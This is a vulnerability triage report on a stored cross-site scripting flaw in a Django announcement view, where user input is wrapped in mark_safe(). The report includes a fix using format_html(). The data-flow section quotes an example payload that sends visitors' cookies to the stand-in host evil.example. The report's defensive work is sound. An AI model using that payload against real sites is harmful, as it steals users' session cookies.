## Verdict

- **CWE ID:** CWE-79 (Improper Neutralization of Input During Web Page Generation - Cross-Site Scripting)
- **Location:** `DjangoMarkSafeMisuse.py`, line 23 (`mark_safe(banner_markup)` inside `build_announcement_html`)
- **Verdict:** exploitable
- **Confidence:** high

## Source

- **Source:** `request.POST.get("announcement", "")` at line 8 - attacker-controlled POST body field, submitted by the "organizer" role through the announcement banner form.
- **Data flow:** `announcement_text` is trimmed with `.strip()` (line 11), which only removes leading/trailing whitespace and neutralizes nothing HTML-relevant. It is then passed unchanged into `build_announcement_html()`, where it is interpolated with `"<div class='announcement'>{0}</div>".format(announcement_text)` (line 21) and the resulting string is wrapped in `mark_safe()` (line 23). `mark_safe()` marks the string as pre-escaped, so Django's template auto-escaping is disabled for it when `context["announcement"]` is rendered in `events/announcement_banner.html`. No HTML encoding or sanitization occurs anywhere on this path, so a payload such as `"><script>document.location='https://evil.example/steal?c='+document.cookie</script>` submitted in the `announcement` field is rendered verbatim into the page and executes in the browser of anyone who views the event page.
- **Sink contract:** `mark_safe()` returns a `SafeString` wrapping exactly the bytes passed in, with no transformation of its own - it performs no escaping, so its only effect is to suppress Django's auto-escaping when the value is later interpolated into a template. The caller (`event_announcement_view`) puts the returned value straight into the template context under `"announcement"`; nothing downstream re-checks or re-escapes it. There is no error path - it cannot fail on ordinary string input.

## Fix

Vulnerable code (`build_announcement_html`, line 20-23):

```python
def build_announcement_html(announcement_text):
    banner_markup = "<div class='announcement'>{0}</div>".format(announcement_text)
    # SAST FINDING: CWE-79 reported here. Sink is the next statement.
    return mark_safe(banner_markup)
```

Fixed code:

```python
from django.utils.html import format_html


def build_announcement_html(announcement_text):
    return format_html("<div class='announcement'>{0}</div>", announcement_text)
```

The `mark_safe` import at the top of the file (`from django.utils.safestring import mark_safe`) is no longer used anywhere in the module and should be removed along with it; `format_html` is imported from `django.utils.html` in its place.

## Explanation

`format_html()` is Django's built-in-safe equivalent of `str.format()`: it HTML-escapes every positional/keyword argument before substituting it into the literal template string, then returns the combined result as a `SafeString`, so no separate `mark_safe()` call is needed or correct afterward. Replacing the `.format()` + `mark_safe()` pair with `format_html()` closes the injection because `announcement_text` is now escaped (`<`, `>`, `&`, `'`, `"` become entities) before it becomes part of the markup, so an injected `<script>` or attribute-breakout payload renders as inert text inside the `<div>` instead of as markup. The static HTML wrapper (`<div class='announcement'>...</div>`) is unaffected since it comes from the trusted literal portion of the template string, which `format_html()` never escapes.

## Behaviour changes

- **Escaping of `announcement_text`:** the announcement content is now HTML-escaped before display, so a value containing `<`, `>`, `&`, or quote characters will render as literal escaped text in the banner rather than as HTML/script. This is the intended effect of the fix, not a side effect - any prior behaviour that depended on organizers being able to submit raw HTML in the announcement (e.g. `<b>` for bold) is removed. If rich formatting is a genuine product requirement, the fix should instead route `announcement_text` through `nh3.clean()` with a minimal tag/attribute allowlist before formatting; no evidence in this file indicates that requirement exists, so the plain-escaping fix is applied.
- **Return type:** `build_announcement_html()` still returns a `django.utils.safestring.SafeString`, matching the original return type, so `event_announcement_view()` and the template that consumes `context["announcement"]` need no other changes.
- **Removed import:** `mark_safe` is no longer imported/used in this module; `format_html` is imported instead. This is a direct consequence of the fix, not scope creep, since leaving the unused `mark_safe` import in place would be dead code.
- All other behaviour (the `organizer_name` field, the `.strip()` call, the view's control flow and template name) is unchanged.
